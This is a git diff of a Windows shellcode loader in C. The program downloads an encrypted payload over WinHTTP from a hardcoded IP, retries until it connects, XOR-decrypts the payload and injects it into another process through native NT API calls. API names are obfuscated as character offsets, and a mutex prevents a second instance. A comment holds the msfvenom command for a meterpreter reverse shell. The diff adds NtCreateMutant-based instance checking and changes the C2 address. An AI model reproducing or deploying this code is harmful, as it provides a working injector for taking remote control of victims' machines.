@@ -6,6 +6,7 @@
 #include <tlhelp32.h>
 #pragma comment(lib,"Winhttp")
 
+NTSTATUS STATUS;
 
 /* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f csharp exitfunc=thread*/
 
@@ -101,26 +102,130 @@ HMODULE Get_Module(LPCWSTR Module_Name)
 	return hModule;
 }
 
-HANDLE m_stuff(FARPROC mux_create_func){
-	//printf("[+] creating mutex\n");
+HANDLE m_stuff(NtOpenMutant NT_OpenMutant, NtCreateMutant NT_CreateMutant,HANDLE hMux,ObjectAttributes *Object_Attr_mutant){
+	STATUS = NT_OpenMutant(&hMux,MUTANT_ALL_ACCESS,Object_Attr_mutant);
 	
-	SECURITY_ATTRIBUTES sec_attr = {(DWORD) sizeof(SECURITY_ATTRIBUTES), NULL , TRUE};
-	
-	HANDLE my_mux = mux_create_func(&sec_attr,TRUE,"nt_ject_m");
-	if (GetLastError() == ERROR_ALREADY_EXISTS) {
-    // Malware instance already running
-	//printf("[x] malware is already running \n");
-    exit(1);  // Exit or perform cleanup
+	//STATUS_OBJECT_NAME_NOT_FOUND
+	if(STATUS == 0xc0000034){
+		printf("[NT_OpenMutant] Mutant Object DOESN'T EXIST , status code 0x%lx\n",STATUS);
 	}
-	//printf("[+] mutex created successfully\n");
-	return my_mux;
+	
+	else if (STATUS == STATUS_SUCCESS){
+		printf("[NT_OpenMutant] Got Mutant Handle -> [0x%p]\n",hMux);
+		printf("[NT_OpenMutant] Mutant Object EXISTS\n");
+		printf("[x] EXITING\n");
+		exit(0);
+	}
+	
+	printf("[NT_CreateMutant] Attempting to create mutant object\n");
+	STATUS = NT_CreateMutant(&hMux,MUTANT_ALL_ACCESS,Object_Attr_mutant,TRUE);
+	if(STATUS != STATUS_SUCCESS){
+		printf("[NT_CreateMutant] Failed to create mutant object , error 0x%lx\n",STATUS);
+		
+		return EXIT_FAILURE;
+	}
+	printf("[NT_CreateMutant] Created Mutant, Handle -> [0x%p]\n",hMux);
+	system("pause");
+	
+	return hMux;
 }
 
 
 
 unsigned char magic[511];
 int main(){
+	// --- START OFFSETS --- //
+	int create_snap_offset[] = {28,17,4,0,19,4,45,14,14,11,7,4,11,15,55,54,44,13,0,15,18,7,14,19};
+	int proc_first_offset[] = {41,17,14,2,4,18,18,55,54,31,8,17,18,19};
+	int proc_next_offset[] = {41,17,14,2,4,18,18,55,54,39,4,23,19};
+	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
+	int dll_n__t_offset[] = {39,45,29,37,37};
+	int lib_load_offset[] = {37,14,0,3,37,8,1,17,0,17,24,26};
+	//int mux_create_offset[] = {28,17,4,0,19,4,38,20,19,4,23,26};
+	// --- END OFFSETS --- /
 	
+	// --- init variables --- //
+	
+	//int PID=atoi(argv[1]);
+	HANDLE hThread;
+	HANDLE hProcess;
+	HANDLE hMux;
+	DWORD OldProtect_MEM = 0;
+	DWORD OldProtect_THREAD = 0;
+	SIZE_T BytesWritten = 0;
+	SIZE_T magic_size = sizeof(magic);
+	BOOL bValue;
+	//HMODULE hNTDLL = Get_Module(L"NTDLL");
+	
+	HMODULE hK32 = Get_Module(L"Kernel32");
+	PVOID Buffer = NULL;	//for shellcode allocation
+	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
+		
+	char key1= 'P';
+	char key2= 'L';
+	char key3= 'S';
+	char key4= 'a';
+	char key5= '5';
+	
+
+	
+	// --- end variables init --- //
+	
+
+	// --- START INIT STRUCTS --- //
+	ObjectAttributes Object_Attr = { sizeof(Object_Attr),NULL };
+	
+	CLIENT_ID CID ;
+	
+	ObjectAttributes Object_Attr_mutant = {sizeof(Object_Attr),NULL};
+	UNICODE_STRING MutantName;
+	RtlInitUnicodeString(&MutantName, L"\\BaseNamedObjects\\MyMutant");
+	Object_Attr_mutant.ObjectName = &MutantName;
+	// --- END INIT STRUCTS --- //
+
+	// --- START GET LoadLibraryA function ---//
+	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));
+	// --- END GET LoadLibraryA function ---//
+
+
+	// --- START LOAD KERNEL32 DLL --- //
+	HMODULE hDLL_k_er_32 = L_0_D_LIB(GetOriginal(dll_k_er_32_offset,ALL_ALPHANUM,sizeof(dll_k_er_32_offset)));
+	if (hDLL_k_er_32 == NULL){
+		//printf("[x] COULD NOT LOAD kernel32.dll, err -> %lu\n",GetLastError());
+		exit(1);
+	}
+	// --- END LOAD KERNEL32 DLL ---//
+	
+	// --- START LOAD NTDLL DLL --- //
+	HMODULE hDLL_n__t = L_0_D_LIB(GetOriginal(dll_n__t_offset,ALL_ALPHANUM,sizeof(dll_n__t_offset)));
+	if (hDLL_k_er_32 == NULL){
+		//printf("[x] COULD NOT LOAD ntdll.dll, err -> %lu\n",GetLastError());
+		exit(1);
+	}
+	// --- END LOAD NTDLL DLL ---//
+	
+	// --- START FUNCTION PROTOTYPES INIT --- //
+	//printf("[+] getting prototypes ready...\n");
+	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, "NtOpenProcess"); 
+	NtCreateProcessEx NT_CreateProcessEx = (NtCreateProcessEx)GetProcAddress(hDLL_n__t,"NtCreateProcessEx");
+	NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, "NtCreateThreadEx"); 
+	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, "NtClose");
+	NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,"NtAllocateVirtualMemory");	
+	NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,"NtWriteVirtualMemory");		
+	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,"NtProtectVirtualMemory");	
+	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,"NtWaitForSingleObject");
+	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,"NtFreeVirtualMemory");
+	NtOpenMutant NT_OpenMutant = (NtOpenMutant)GetProcAddress(hDLL_n__t,"NtOpenMutant");
+	NtCreateMutant NT_CreateMutant = (NtCreateMutant)GetProcAddress(hDLL_n__t,"NtCreateMutant");
+	FARPROC create_snap_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_snap_offset,ALL_ALPHANUM,sizeof(create_snap_offset)));
+	FARPROC proc_first_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_first_offset,ALL_ALPHANUM,sizeof(proc_first_offset)));
+	FARPROC proc_next_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_next_offset,ALL_ALPHANUM,sizeof(proc_next_offset)));
+	//FARPROC mux_create_func =  GetProcAddress(hDLL_k_er_32,GetOriginal(mux_create_offset,ALL_ALPHANUM,sizeof(mux_create_offset))); //mutex
+	//printf("[+] prototypes are ready...\n");
+	// --- END FUNCTION PROTOTYPES INIT --- //
+	
+	
+	hMux=m_stuff(NT_OpenMutant,NT_CreateMutant,hMux,&Object_Attr_mutant);
 
 	
 	
@@ -129,9 +234,9 @@ int main(){
 		//printf("[x] WinHttpOpen FAILED %lu\n",GetLastError());
 		return 1;
 	}
-	//printf("[+] WinHttpOpen DONE\n");
+	///printf("[+] WinHttpOpen DONE\n");
 	
-	HINTERNET hConnect = WinHttpConnect(hSession,L"192.168.100.13",8000,0);
+	HINTERNET hConnect = WinHttpConnect(hSession,L"192.168.8.145",8000,0);
 	if ( !hConnect ){
 		//printf("[x] WinHttpConnect FAILED, %lu\n",GetLastError());
 		return 1;
@@ -146,12 +251,14 @@ int main(){
 	}
 	//printf("[+] WinHttpOpenRequest DONE\n");
 	
-	if ( WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0) == FALSE ){
-		//printf("[x] WinHttpSendRequest FAILED %lu\n",GetLastError());
-		return 1;
+	do{
 		
-	}
+		bValue = WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0);
+		
+	} while (bValue == FALSE);
 	//printf("[+] WinHttpSendRequest DONE\n");
+
+	
 	
 	if ( WinHttpReceiveResponse(hRequest,NULL) == FALSE ){
 		//printf("[x] WinHttpReceiveResponse FAILED %lu\n",GetLastError());
@@ -202,86 +309,8 @@ int main(){
 	
 	
 	
-	// --- START OFFSETS --- //
-	int create_snap_offset[] = {28,17,4,0,19,4,45,14,14,11,7,4,11,15,55,54,44,13,0,15,18,7,14,19};
-	int proc_first_offset[] = {41,17,14,2,4,18,18,55,54,31,8,17,18,19};
-	int proc_next_offset[] = {41,17,14,2,4,18,18,55,54,39,4,23,19};
-	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
-	int dll_n__t_offset[] = {39,45,29,37,37};
-	int lib_load_offset[] = {37,14,0,3,37,8,1,17,0,17,24,26};
-	int mux_create_offset[] = {28,17,4,0,19,4,38,20,19,4,23,26};
-	// --- END OFFSETS --- /
-	
-	// --- init variables --- //
-	
-	//int PID=atoi(argv[1]);
-	NTSTATUS STATUS;
-	HANDLE hThread;
-	HANDLE hProcess;
-	DWORD OldProtect_MEM = 0;
-	DWORD OldProtect_THREAD = 0;
-	SIZE_T BytesWritten = 0;
-	SIZE_T magic_size = sizeof(magic);
-	//HMODULE hNTDLL = Get_Module(L"NTDLL");
-	//HMODULE hNTDLL = Get_Module(L"NTDLL");
-	HMODULE hK32 = Get_Module(L"Kernel32");
-	PVOID Buffer = NULL;	//for shellcode allocation
-	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
-		
-	char key1= 'P';
-	char key2= 'L';
-	char key3= 'S';
-	char key4= 'a';
-	char key5= '5';
-	
-	// --- end variables init --- //
-	
-
-	// --- START INIT STRUCTS --- //
-	ObjectAttributes Object_Attr = { sizeof(Object_Attr),NULL };
-	
-	CLIENT_ID CID ;
-	// --- END INIT STRUCTS --- //
-
-	// --- START GET LoadLibraryA function ---//
-	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));
-	// --- END GET LoadLibraryA function ---//
 
 
-	// --- START LOAD KERNEL32 DLL --- //
-	HMODULE hDLL_k_er_32 = L_0_D_LIB(GetOriginal(dll_k_er_32_offset,ALL_ALPHANUM,sizeof(dll_k_er_32_offset)));
-	if (hDLL_k_er_32 == NULL){
-		//printf("[x] COULD NOT LOAD kernel32.dll, err -> %lu\n",GetLastError());
-		exit(1);
-	}
-	// --- END LOAD KERNEL32 DLL ---//
-	
-	// --- START LOAD NTDLL DLL --- //
-	HMODULE hDLL_n__t = L_0_D_LIB(GetOriginal(dll_n__t_offset,ALL_ALPHANUM,sizeof(dll_n__t_offset)));
-	if (hDLL_k_er_32 == NULL){
-		//printf("[x] COULD NOT LOAD ntdll.dll, err -> %lu\n",GetLastError());
-		exit(1);
-	}
-	// --- END LOAD NTDLL DLL ---//
-	
-	// --- START FUNCTION PROTOTYPES INIT --- //
-	//printf("[+] getting prototypes ready...\n");
-	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, "NtOpenProcess"); 
-	NtCreateProcessEx NT_CreateProcessEx = (NtCreateProcessEx)GetProcAddress(hDLL_n__t,"NtCreateProcessEx");
-	NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, "NtCreateThreadEx"); 
-	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, "NtClose");
-	NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,"NtAllocateVirtualMemory");	
-	NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,"NtWriteVirtualMemory");		
-	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,"NtProtectVirtualMemory");	
-	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,"NtWaitForSingleObject");
-	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,"NtFreeVirtualMemory");
-	FARPROC create_snap_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_snap_offset,ALL_ALPHANUM,sizeof(create_snap_offset)));
-	FARPROC proc_first_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_first_offset,ALL_ALPHANUM,sizeof(proc_first_offset)));
-	FARPROC proc_next_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_next_offset,ALL_ALPHANUM,sizeof(proc_next_offset)));
-	FARPROC mux_create_func =  GetProcAddress(hDLL_k_er_32,GetOriginal(mux_create_offset,ALL_ALPHANUM,sizeof(mux_create_offset))); //mutex
-	//printf("[+] prototypes are ready...\n");
-	// --- END FUNCTION PROTOTYPES INIT --- //
-	HANDLE hMux=m_stuff(mux_create_func);
 	
 	CID = e_p(create_snap_func,proc_first_func,proc_next_func);
 	// --- START GET PROCESS --- //
@@ -306,6 +335,7 @@ int main(){
 	decrypt(magic,magic_size,key2);
 
 	decrypt(magic,magic_size,key1);
+	
 
 	// --- end decryption --- //
 
@@ -373,6 +403,10 @@ CLEANUP:
 	if(hProcess){
 		//printf("[NtClose] Closing hProcess handle\n");
 		NT_Close(hProcess);
+	}
+	if(hMux){
+		//printf("[NtClose] Closing hMux handle\n");
+		NT_Close(hMux);
 	}
 	
 	return EXIT_SUCCESS;
